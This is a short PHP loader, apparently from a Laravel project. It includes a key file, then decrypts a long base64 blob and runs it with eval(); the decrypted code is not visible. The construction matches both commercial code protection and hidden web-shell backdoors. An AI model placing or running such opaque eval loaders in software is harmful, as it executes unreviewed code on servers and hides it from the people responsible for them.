<?php
$keyfile = public_path("key.inc.php");
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists($keyfile)){include_once($keyfile);}else{die("<h2>include: $keyfile not found!</h2>");}
$e7091="R1AvY09jY1dQY2cwT3Iwb2RxYk1CNTZCZE9PNndtMW0wOUpiQUVRaUNQV05WM2hXcWljclIyN1J1Mzlmc0tJZUNnMzZaSWQyR3FZSHVMOXZ3M2xXeVJDcHdpRzJ4TjdsNGZZSVdmS09lWk1tTVlMbFBSclBBa3NrOFJONVRZYndVaWFRcjI2RDNoM2tPRkQ3VVQ0dGljZ3c4WXFLa05oNllzanh0cnY5WU15RnFuYTgwTjNJOGt0YWRzUFZFbkRZVXFSTWE3dVdrNzZSUGErM2FtWWRad0dIQXBRVm5qRWMyTXZpazlGcFc5K0VFMGQzaDZFdERvbmRwZGs5UHpHVmxUUTV6NExkMWRZOWFYcHJjdzNzSTVnOWNPZnFDcHlEREhUTEtxMUg2NjJNWW9WZ0d3NU80QjltTkVPN0R6dy9iTWZKNGxNMitQbmxSUlFlYVBObVFYc0lQc3VhUHFQb0c3emlwU25DRUZrSE9XYXR1aFFiZDcyNjB2ejU5V1liWC9xR2VrVElkN0tJbGdGVHFHcEF0WHBMQk8rRGhETThpS2o4R0lTM3g3VjJ3K0tkUjhWcUJnMjRSSDY2SUR3OFZVSnVORUNhUTdPTmtRVXVNTitHVWNUdThJZlllVGhETTVIbnRJQm1XUmUzZGQ3OGNCbnZZNkkxWmdJVnRWOExwSnp6dHdFUTJOVjdvL3lLWUxxWUFrVWRwOXBlbzdScGdISGxPYWZZS1BpbElEbHRxZzVTRU1nZ3U1c2NFaUhyVlZzU3BGeUpEM01WeWNGRTRSTENOUUtieVhkeGd6MHhRK2ZWNk1oYjZjMXlWZWFQUVl0djR5STJHNUJNT0M4WUppTU9MYkFUQnB1aEtqKzhCU3RVVmFGa0JIdmMrbU9FVXVsWWFieTh5Z2RMZVBNdmRMUlZCaVByY0dSZnFaN1EzckpVSHpvSHpQRjNySUVwNlJ2VTJkZlk2dkVIVkczY2FpUFp2dDBkREk4PQ==";eval(e7061($e7091));

